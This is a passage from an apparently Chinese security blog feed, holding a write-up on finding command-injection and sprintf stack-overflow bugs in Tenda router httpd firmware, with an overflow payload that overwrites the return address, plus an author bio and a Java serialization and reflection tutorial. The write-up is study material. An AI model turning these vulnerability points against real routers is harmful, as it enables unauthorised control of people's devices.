src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103859404.png" alt="image-20220422103859404"></p><p>其参数为全局变量 g_lan_ip。设置个lanip</p><blockquote><p>sudo tunctl -t br0 -u ‘用户名’</p><p>sudo ifconfig br0 192.168.5.1&#x2F;24</p></blockquote><p> ps eth1就是第二块网卡第一块通常是eth<em>0</em> <em>tap</em>是虚拟网络接口 <em>br</em>是网桥</p><p>这个设置完之后问题2直接解决了。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422110341615.png" alt="image-20220422110341615"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422110418896.png" alt="image-20220422110418896"></p><h1 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h1><p>分析其使用的web服务器，常见的嵌入式有以下几种：httpd，uhttpd，gohead，lighttpd，boa</p><p>还有其他的，我没咋见过，就不写了，用到的话自行查阅（懒！）</p><p>我分析这款使用的是httpd，在bin目录下，一般服务器文件都在一下几个目录，不排除其他目录</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/user/</span>bin/<span class="hljs-regexp">/user/</span>sbin/<span class="hljs-regexp">/bin/</span></code></pre></div><p>在逆向分析httpd时，尽量关注一些自定义功能代码，main下调用的initwebs函数中，配置了前端访问方式</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422112301584.png" alt="image-20220422112301584"></p><p>可以看到默认页面main，</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422112355613.png" alt="image-20220422112355613"></p><p><code>websSetPassword</code>设置访问口令，不多说各位调试的时候可以关注一下。</p><p><code>websUrlHandlerDefine</code>需要关注，这个函数的意思是什么样的url交给谁处理。</p><p>上面说了<code>尽量关注一些自定义功能代码</code></p><p>这里的自定义功能代码就在<code>formDefineTendDa</code>中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422113423088.png" alt="image-20220422113423088"></p><p>上面这些都是通过<code>goform</code>来处理的，所以其访问形式为 <a href="http://127.0.0.1/goform/TendaGetLongString%E8%BF%99%E6%A0%B7%E7%9A%84">http://127.0.0.1:80/goform/TendaGetLongString这样的</a></p><p>哪个路径就交由哪个函数来处理。</p><p>下面分析可以由两方面展开：</p><p>分析各个功能点</p><blockquote><p> 简单来说就是将所有接口的代码过一遍，去分析参数从哪里来，有没有经过什么危险函数</p></blockquote><p>这种的话效率比较低，我个人推荐第二种</p><p>通过危险函数来查找可利用点，利用逆向分析工具的交叉编译功能查找</p><p>这里放一张危险函数表</p><p>dosystemcmd</p><p>system</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/0B814D68-9F2F-437C-A067-BB97942160E8.png">根据上面的函数表来将危险函数过一下</p><p>下面是之前分析到的两个问题的思路，住这里不涉及exp，poc等脚本的编写，还是以思路为主。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>过一遍dosystemcmd函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422141922087.png" alt="image-20220422141922087"></p><p>可以看到有145次调用，感觉有漏洞的几率还是挺大的</p><p>注意点，尽量找form这类的函数，即上面说的自定义功能，有前后端交互</p><p>且危险函数的参数来自于前端参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422142703774.png" alt="image-20220422142703774"></p><p><code>websGetVar</code>就是从wp中获取其第二个参数对应的值，如果没有该参数，值默认为第三个参数。</p><p>上面可以看到这里pcVar1未作任何处理直接拼接到参数中。</p><p>这里就产生了命令执行，不多做赘述，各位有兴趣可自行复现。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>溢出是在strpintf函数的调用中发现的。</p><p>goform&#x2F;NatStaticSetting路径访问到fromNatStaticSetting函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsnHFtW8.jpg" alt="img"> </p><p>sprintf函数将page的参数给拼接到字符串中，未做长度校验，导致溢出</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsOGISIR.jpg" alt="img"> </p><p>复现过程：</p><p>断点到fromNatStaticSetting函数入口</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wps0paJou.jpg" alt="img"> </p><p>将调用fromNatStaticSetting函数的返回地址放入0x407FFAE4    处</p><p>向下执行到第三个websGetVar函数获取page参数，然后向下执行sprintf函数，将page参数的内容拼接到gotopage内，由代码可知长度为256</p><p>参数初始化完毕后发现gotopage位置为0x407FF9E0</p><p>这里我们传入page参数为：</p><div class="code-wrapper"><pre><code class="hljs abnf"><span class="hljs-attribute">page</span><span class="hljs-operator">=</span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacAAAA</code></pre></div><p>执行完后</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsi5rSOK.jpg" alt="img"> </p><p>返回地址0x407FFAE4已经被AAAA覆盖。</p><p>上面是一些思路之类的东西，第一个命令执行晚了几天。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于我</title>
    <link href="/article/9ff79b23.html"/>
    <url>/article/9ff79b23.html</url>
    
    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>24（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）（bushi）</p><p>2023成功追女生失败，还是一个单身狗。</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八的唠叨话</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java序列化与反序列化</title>
    <link href="/article/335a6663.html"/>
    <url>/article/335a6663.html</url>
    
    <content type="html"><![CDATA[<p>java序列化指的是将java对象转化为字节序列的过程<br>java反序列化指字节序列恢复到java对象</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote><p>计算机内存最小单位为一个二进制位，即 0或1<br>我们吧这个二进制位称为一个bit（比特）位</p><p>一个字节（byte）有八个比特位，即 byte &#x3D; 8*bit<br>如果八个bit位都为1，即这个字节最大为 FF &#x3D; 1111 1111</p><p>一个字（word）是两个byte，即 word &#x3D; 2 * byte &#x3D; 16 * bit<br>则一个字最大为 FFFF </p><p>doubleword 双字，是两个word ，即四个byte，32*bit<br>一个doubleword为FFFF FFFF</p><p>一般情况下使用最多的是字节，字节相当于人民币的元一样，虽然不是最低的，但却是最常用的</p><p>一串字符在内存中一般是以ascii编码形式存在，不同编码占用子节长度不同</p><p>一个ascii码的占用一个字节</p><p>unicode码占用一个字（两个字节）<br>utf-8 是我们国内常用的是针对unicode码的一种可变编码方式。<br>ascii<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141904498.png" alt="image-20220402141904498">unicode<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141909806.png" alt="image-20220402141909806"><br>字节序<br>当一串数据太大的时候，一个字节放不下，就需要使用多个字节<br>比如0x12345678<br>就需要四个字节<br>而现在就有了两种存放方式<br>我们称这两种为 小端序和大端序<br>小端序从屁股开始，大端序从头开始<br>小端序<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141918940.png" alt="image-20220402141918940"><br>大端序<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141924848.png" alt="image-20220402141924848"><br>各家架构不同，使用的大小端序不同，无需纠结<br>但是后来计算机网络通信出来了，大家如果有不同的话会导致混乱<br>tcp&#x2F;ip协议出来之后就规定网络通信必须使用大端序<br>以上就是字节序的基本知识</p></blockquote><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>序列化：</p><blockquote><p>对象序列化的最主要的用处就是在传递和保存对象的时候，保证对象的完整性和可传递性。序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。序列化后的字节流保存了Java对象的状态以及相关的描述信息。序列化机制的核心作用就是对象状态的保存与重建。</p></blockquote><p>反序列化：</p><blockquote><p>客户端从文件中或网络上获得序列化后的对象字节流后，根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。</p></blockquote><p>序列化就是把实体对象状态按照一定的格式写入到有序字节流，反序列化就是从有序字节流重建对象，恢复对象状态。</p><p>上面的简单点说，进程间通信可以将图片，视频，音频等信息用二进制方式传输。但是进程间的对象却不能这么搞。</p><blockquote><p>比如我创建了一个User u1 &#x3D; new User(1,”a”,100);<br>我要将它传给另一个软件（进程）<br>进程间的对象想要传输就需要序列化和反序列化<br>序列化为二进制数据，可以永久存在硬盘里，也可以进行网络传输</p></blockquote><h2 id="实现java序列化和反序列化"><a href="#实现java序列化和反序列化" class="headerlink" title="实现java序列化和反序列化"></a>实现java序列化和反序列化</h2><p>下面嫌太长了可以直接看例子</p><h3 id="JDK类库中序列化和反序列化API"><a href="#JDK类库中序列化和反序列化API" class="headerlink" title="JDK类库中序列化和反序列化API"></a>JDK类库中序列化和反序列化API</h3><p>java.io.ObjectOutputStream：</p><blockquote><p>表示对象输出流；<br>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中；<br>java.io.ObjectInputStream：<br>表示对象输入流；它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回；</p></blockquote><h3 id="实现序列化的要求"><a href="#实现序列化的要求" class="headerlink" title="实现序列化的要求"></a>实现序列化的要求</h3><blockquote><p>只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常！</p></blockquote><h3 id="实现Java对象序列化与反序列化的方法"><a href="#实现Java对象序列化与反序列化的方法" class="headerlink" title="实现Java对象序列化与反序列化的方法"></a>实现Java对象序列化与反序列化的方法</h3><p>若User类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化</p><blockquote><p>ObjectOutputStream采用默认的序列化方式，对User对象的非transient的实例变量进行序列化。<br>ObjcetInputStream采用默认的反序列化方式，对对User对象的非transient的实例变量进行反序列化。</p></blockquote><p>若User类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化。</p><blockquote><p>ObjectOutputStream调用User对象的writeObject(ObjectOutputStream out)的方法进行序列化。<br>ObjectInputStream会调用User对象的readObject(ObjectInputStream in)的方法进行反序列化。</p></blockquote><p>若User类实现了Externalnalizable接口，且User类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。</p><blockquote><p>ObjectOutputStream调用User对象的writeExternal(ObjectOutput out))的方法进行序列化。<br>ObjectInputStream会调用User对象的readExternal(ObjectInput in)的方法进行反序列化。</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>user对象，使用的是上述第一种方式，所以User要实现Serializable</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java.io.<span class="hljs-keyword">Serializable</span>;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">User</span> implements <span class="hljs-keyword">Serializable</span> &#123;    <span class="hljs-type">int</span> id;    String <span class="hljs-type">name</span>;    String phone;  #一些<span class="hljs-keyword">get</span> <span class="hljs-keyword">set</span> 构造参数，这里就不列举了&#125;</code></pre></div><p>序列化与反序列化</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">userDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-comment">//创建对象</span>        <span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;AAAAAAA&quot;</span>,<span class="hljs-string">&quot;110&quot;</span>); <span class="hljs-comment">//被序列化的对象</span>        User u2; <span class="hljs-comment">//反序列化的对象</span>        <span class="hljs-comment">//序列化</span>        getSerial(u1);        <span class="hljs-comment">//反序列化</span>        u2 = backSerial();        System.out.println(u2.getName());    &#125;    <span class="hljs-comment">//序列化</span>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getSerial</span><span class="hljs-params">(User u1)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;obj.out&quot;</span>);        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);        oos.writeObject(u1);        oos.flush();        oos.close();    &#125;    <span class="hljs-comment">//反序列化</span>    <span class="hljs-keyword">static</span> User <span class="hljs-title function_">backSerial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;obj.out&quot;</span>);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);        <span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> (User) ois.readObject();        <span class="hljs-keyword">return</span> u1;    &#125;&#125;</code></pre></div><h2 id="序列化底层分析"><a href="#序列化底层分析" class="headerlink" title="序列化底层分析"></a>序列化底层分析</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141932582.png" alt="image-20220402141932582">ObjdectOutputStream对象的初始化</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141939840.png" alt="image-20220402141939840"></p><p>bout是数据输出流的底层<br>writeStreamHeader将文件头写入文件<br><img src="https://gitee.com/p1piyang/image/raw/master/CE553829-55BC-4109-B70B-1F616E881FD5.png" alt="CE553829-55BC-4109-B70B-1F616E881FD5"><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141946262.png" alt="image-20220402141946262">这里根据序列化的文件分析<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141953303.png" alt="image-20220402141953303">所以这里是写入文件头，表示声明使用序列化协议以及说明序列化版本<br>初始化完毕，文件存在且写入了文件头。<br>开始序列化写入文件<br>writeObject(u1);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141959955.png" alt="image-20220402141959955">向下调用write0ject0();<br>这个方法的内容比较长<br>重要点在意思是按照不同类型的方法去写入序列化数据，可以看上面<code>实现Java对象序列化与反序列化的方法</code><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142009374.png" alt="image-20220402142009374">我们实例中实现了Serializable，所以执行writeOrdinaryObject方法<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142016424.png" alt="image-20220402142016424">bout.writeByte(TC_OBJECT);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142025632.png" alt="image-20220402142025632"></p><p>写入了0x73<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142032838.png" alt="image-20220402142032838">调用 writeClassDesc(desc, false);<br>跟进<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142040520.png" alt="image-20220402142040520">这里isProxy是判断类是否是动态代理模式</p><blockquote><p>具体可以自行了解，我也不清楚<br>因为我们实例的类不是动态代理，所以跟进writeNonProxyDesc();<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142047197.png" alt="image-20220402142047197">先写入了描述符号0x72<img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142056003.png" alt="image-20220402142056003"><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142102038.png" alt="image-20220402142102038">下面判断跟进两个参数一个为1，一个为2<br>跟进writeClassDescriptor(desc);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142108822.png" alt="image-20220402142108822">和true执行同一个方法<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142117842.png" alt="image-20220402142117842">在开发中，我们经常会遇到要经过for循环来判断该循环体中是否包含或不包含某一元素，这个时候我们也常用一个boolean值来介入判断。而“|&#x3D;”可以轻松的让我们完成实现</p><p>boolean flag &#x3D; false; 在一个循环体中，flag |&#x3D; (c&#x3D;&#x3D;e);如果一直不相等，则flag一直为false,一旦有一个相等则为true；</p></blockquote><p>out.writeUTF(name);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142126634.png" alt="image-20220402142126634"></p><p>写入类名<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142131744.png" alt="image-20220402142131744">out.writeLong(getSerialVersionUID());<br>写入序列化uid</p><p>再往下一堆if判断接口的实现方式，将标志位写入<br>out.writeByte(flags);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142137832.png" alt="image-20220402142137832"></p><p>我们使用serializable，所以应该写入0x02<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142143947.png" alt="image-20220402142143947">所以从0x000B - 0x0013 都是序列化uid<br>然后调用writeShort写入两个字节的域长度（比如说有3个变量，就写入 00 03 )<br>实例中有三个参数<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142150620.png" alt="image-20220402142150620">接下来就是循环写入变量名和变量类型<br> 每轮循环:</p><blockquote><p>writeByte写入一个字节的变量类型;</p><p>writeUTF()写入变量名</p><p>判断是不是原始类型，即是不是对象</p><p>不是原始类型(基本类型)的话，就调用writeTypeString()<br>这个writeTypeString()，如果是字符串，就会调用writeString()</p><p>而这个writeString()往往是这样写的，字符串长度(不是大小)小于两个字节，就先写入一个字节的TC_STRING(16进制 74)，然后调用writeUTF()，写入一个signature，这好像跟jvm有关，最后一般写的是类似下面这串</p><p>74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b<br>“翻译”过来就是，字符串类型，占18个字节长度，变量名是 Ljava&#x2F;lang&#x2F;string;<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142157021.png" alt="image-20220402142157021">红色 id参数 int 类型<br>绿色 name 参数 string 因为 String是引用数据类型所以调用了writeTypeString() 写入了Ljava&#x2F;lang&#x2F;string;<br>黄色 phone 参数 string<br>这里第一次看有个疑问<br>phone参数也是string，但是他却没Ljava&#x2F;lang&#x2F;string;这一串<br>后边又增加一个string的参数，确定同一种引用数据类型只写入一次。</p></blockquote><p>循环执行完，返回到writeNonProxyDesc方法<br>写入结束标志位0x78<br>bout.writeByte(TC_ENDBLOCKDATA);<img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142203943.png" alt="image-20220402142203943"><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142209296.png" alt="image-20220402142209296">准备开始写入序列化数据<br>回到writeOrdinaryObject()方法<br>writeSerialData(obj, desc);方法来写入序列化数据<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142215875.png" alt="image-20220402142215875">这里根据使用方式来判断，所以调用了 defaultWriteFields();<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142224431.png" alt="image-20220402142224431">第二个if是判断是否为基本数据类型，是的话就会直接写入序列化数据，<br>不是的话向下到for循环附近<br>获取变量数，然后循环调用writeObject0()；写入<br>循环结束，直到所有运行完成，回到主函数。<br>反序列化就不写了，反反过来推一遍就成。</p><h2 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h2><p>反射机制允许程序在运行期借助于Reflection API取得任何类的内部信息，并能直接操作任意类和对象的所有属性及方法。</p><p>要使用一个类，就要先把它加载到虚拟机中，在加载完类之后，堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个class对象），这个对象就包含了完整的类的结构信息，我们可以通过这个对象看到类的结构，这个对象就像一面镜子，透过镜子可以看到类的结构，所以形象的称之为：反射。<br>实例：</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">a1Class</span> <span class="hljs-variable">a1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">a1Class</span>();        <span class="hljs-comment">//通过运行时的对象调用getClass();</span>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a1.getClass();        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">//getMethod(方法名,参数类型)</span>            <span class="hljs-comment">//getMethod第一个参数是方法名，第二个参数是该方法的参数类型</span>            <span class="hljs-comment">//因为存在同方法名不同参数这种情况，所以只有同时指定方法名和参数类型才能唯一确定一个方法</span>            <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);            <span class="hljs-comment">//相当于r1.print(1, 2);方法的反射操作是用m1对象来进行方法调用 和r1.print调用的效果完全相同</span>            <span class="hljs-comment">//使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入</span>            <span class="hljs-type">Object</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> m1.invoke(a1,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">a1Class</span> &#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;            System.out.println(a + b);        &#125;    &#125;&#125;</code></pre></div><h3 id="尝试简化上面的代码"><a href="#尝试简化上面的代码" class="headerlink" title="尝试简化上面的代码"></a>尝试简化上面的代码</h3><p>创建另一个文件</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">testMiao</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">maio</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;miao!&quot;</span>);    &#125;&#125;</code></pre></div><p>使用反射来执行miao();</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Object</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>).getMethod(<span class="hljs-string">&quot;maio&quot;</span>).invoke(<span class="hljs-literal">null</span>);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><h3 id="尝试添加参数简化"><a href="#尝试添加参数简化" class="headerlink" title="尝试添加参数简化"></a>尝试添加参数简化</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMiao</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">maio</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> s</span>)&#123;        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;miao!&quot;</span>+s);    &#125;&#125;</code></pre></div><p>反射</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;        <span class="hljs-keyword">try</span> &#123;            Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;maio&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>).<span class="hljs-built_in">invoke</span>(Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>),<span class="hljs-string">&quot;aaa&quot;</span>);        &#125;<span class="hljs-built_in">catch</span> (Exception e)&#123;            e.<span class="hljs-built_in">printStackTrace</span>();        &#125;    &#125;&#125;</code></pre></div><h2 id="java执行命令"><a href="#java执行命令" class="headerlink" title="java执行命令"></a>java执行命令</h2><p>java中可以使用Runtime.getRuntime.exec();来执行系统命令<br>如：<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142235200.png" alt="image-20220402142235200">尝试使用反射来执行</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(<span class="hljs-string">&quot;open /System/Applications/Calculator.app\n&quot;</span>);</code></pre></div><p>这样会报错，报错的信息：是对象不是声明类的实例<br>说明exec只能是通过getRuntime来执行</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;        Object o = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>).<span class="hljs-built_in">invoke</span>(null);        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>).<span class="hljs-built_in">invoke</span>(o,<span class="hljs-string">&quot;open /System/Applications/Calculator.app\n&quot;</span>);    &#125;&#125;</code></pre></div><p>这样会成功，原理跟随反射实例第一个实例来理解。<br>现在可以打开计算器，明白什么是序列与反序列化了。</p><p>关于cc1的链，之后再写，可以看bilibili 白日梦组长分析思路<br>我个人觉得他的思路是真的超级棒。</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump抓包</title>
    <link href="/article/201a570f.html"/>
    <url>/article/201a570f.html</url>
    
